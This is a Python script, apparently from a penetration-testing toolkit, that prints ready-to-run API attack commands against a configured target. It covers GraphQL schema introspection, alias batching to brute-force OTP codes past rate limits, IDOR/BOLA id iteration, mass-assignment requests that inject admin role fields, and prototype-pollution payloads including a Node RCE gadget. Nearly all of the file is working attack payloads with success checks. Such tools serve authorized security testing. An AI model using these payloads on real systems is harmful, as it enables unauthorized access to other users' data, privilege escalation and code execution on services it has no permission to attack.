#!/usr/bin/env python3
"""API attacks -> data / auth bypass / privilege escalation: GraphQL · REST (IDOR/BOLA, mass assignment) ·
prototype pollution. PRINTS payloads/commands. Edit TURL in _web_common.py.

Usage:
  python3 gen_api.py graphql                     # introspection, batching, injection
  python3 gen_api.py idor    [--endpoint /api/users/1]   # BOLA/IDOR + mass assignment
  python3 gen_api.py protopollution              # prototype pollution -> RCE/DoS/bypass (Node)
"""
import sys
import _web_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg = sys.argv[1] if len(sys.argv) > 1 else "graphql"
T = P.TURL

if arg == "graphql":
    print(f"# needs: a reachable GraphQL endpoint (/graphql /api/graphql /v1/graphql).")
    print(f"# 1) introspection (dump the whole schema — often left on) — try first, it maps everything else:")
    print(f"curl -s {T}/graphql -H 'Content-Type: application/json' "
          f"-d '{{\"query\":\"{{__schema{{types{{name fields{{name}}}}}}}}\"}}'")
    print(f"#    -> ok: a JSON schema of all types/fields comes back (introspection is on).")
    print(f"#    off? ->  graphql-cop -t {T}/graphql   ·   clairvoyance (recovers the schema when introspection is disabled)")
    print(f"# 2) authorization flaws — query objects/fields you shouldn't (user by id, isAdmin, other tenants).  -> ok: you read another tenant's data.")
    print(f"# 3) BATCHING — bypass rate-limits / brute MFA-OTP by sending many ops in one request (aliases):")
    print(f"     {{ a:login(otp:\"0000\"){{t}} b:login(otp:\"0001\"){{t}} ... }}")
    print(f"# 4) INJECTION — GraphQL args feed SQL/NoSQL/OS sinks -> see gen_sqli / gen_rce.")

elif arg == "idor":
    ep = opt("--endpoint", "/api/users/1")
    print(f"# needs: an endpoint keyed by an object id (<your-token> = a valid low-priv session token).")
    print(f"# IDOR / BOLA (Broken Object Level Auth) — swap the object id to access others' data:")
    print(f"curl -s {T}{ep} -H 'Authorization: Bearer <your-token>'      # then iterate the id: /2 /3 /1000")
    print(f"# -> ok: you get back ANOTHER user's data (not your own, not 403) = broken object-level auth.")
    print(f"# techniques: increment/UUID-guess ids · change your id -> the victim's · array/wildcard ({{'id':[1,2,3]}}) ·")
    print(f"#   JSON vs form param · add .json / change Accept · HTTP method (GET vs POST vs PUT) · nested/parent objects.")
    print(f"# MASS ASSIGNMENT (BOPLA) — send extra fields the API blindly binds:")
    print(f"curl -s -X PUT {T}/api/users/me -H 'Content-Type: application/json' "
          f"-d '{{\"email\":\"x\",\"role\":\"admin\",\"isAdmin\":true,\"verified\":true}}'   # smuggle privilege fields")
    print(f"# -> ok: re-fetch your profile and the injected field stuck (role=admin) = mass assignment worked.")
    print(f"# also: HTTP method override (X-HTTP-Method-Override: PUT), old API versions (/v1 vs /v2), verb tampering.")

elif arg == "protopollution":
    print(f"# needs: a Node/JS backend that deep-merges attacker JSON into an object (Object.prototype reachable via __proto__).")
    print(f"# PROTOTYPE POLLUTION (Node/JS) — pollute Object.prototype via __proto__ in JSON/query -> RCE/DoS/bypass:")
    print(f"curl -s -X POST {T}/api/x -H 'Content-Type: application/json' "
          f"-d '{{\"__proto__\":{{\"polluted\":\"yes\"}}}}'          # -> ok: a later/unrelated response now carries polluted=yes = the prototype is polluted")
    print(f"# server-side -> RCE gadget (e.g. child_process env / template options):")
    print(f"   {{\"__proto__\":{{\"argv0\":\"node\",\"shell\":\"/bin/sh\",\"NODE_OPTIONS\":\"--require /proc/self/environ\"}}}}")
    print(f"# also ?__proto__[x]=y in query strings; client-side PP -> DOM XSS. Chain to RCE via a known gadget.")
else:
    print("use: graphql | idor | protopollution"); sys.exit(1)

print(f"\n# report as: graphql/api IDOR -> idor(BOLA) · privilege fields -> mass-assignment · proto pollution -> rce_web.")
